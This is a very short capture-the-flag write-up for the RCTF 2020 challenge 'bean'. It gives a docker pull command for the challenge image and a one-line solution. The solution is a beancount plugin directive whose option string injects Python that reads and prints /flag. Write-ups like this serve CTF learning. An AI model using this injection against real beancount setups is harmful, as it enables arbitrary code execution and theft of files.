# bean

```bash
docker pull ghcr.io/zsxsoft/my-ctf-challenges:rctf2020-bean
```

## Solution

```beancount
plugin "beancount.plugins.commodity_attr" "__import__('sys').stdout.write(open('/flag').read())"
```
